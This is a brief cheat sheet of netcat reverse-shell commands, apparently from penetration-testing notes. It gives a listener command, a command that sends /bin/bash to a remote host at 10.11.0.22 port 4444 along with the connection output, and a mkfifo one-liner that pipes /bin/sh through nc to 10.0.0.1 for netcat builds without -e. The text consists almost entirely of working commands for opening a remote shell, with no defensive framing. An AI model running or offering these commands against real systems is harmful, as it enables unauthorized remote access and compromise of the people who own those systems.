# 1) spawn listener for remote shell
```sh
nc -nlvp 4444
```

# 2) send bash to remote attacker
```sh
nc -nv 10.11.0.22 4444 -e /bin/bash
...
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

# Without -e
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
